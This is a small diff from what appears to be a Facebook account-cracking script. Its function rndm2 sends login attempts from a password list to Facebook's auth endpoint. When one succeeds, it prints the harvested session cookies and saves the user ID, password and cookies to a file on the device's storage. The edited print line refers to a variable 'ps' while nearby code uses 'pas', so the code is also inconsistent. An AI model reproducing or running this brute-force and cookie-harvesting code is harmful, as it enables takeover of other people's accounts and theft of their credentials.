@@ -777,7 +777,7 @@ def rndm2(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{B}❲{G}𝐀𝐫𝐚𝐟𝐚𝐭'-OK{B}❳{G} '+uid+f' | '+pas+'\033[1;97m')
+                                         print(f"\r\r [OK] {uid} |{ps}")
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} "+coki)
                                         open('/sdcard/𝐀𝐫𝐚𝐟𝐚𝐭-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
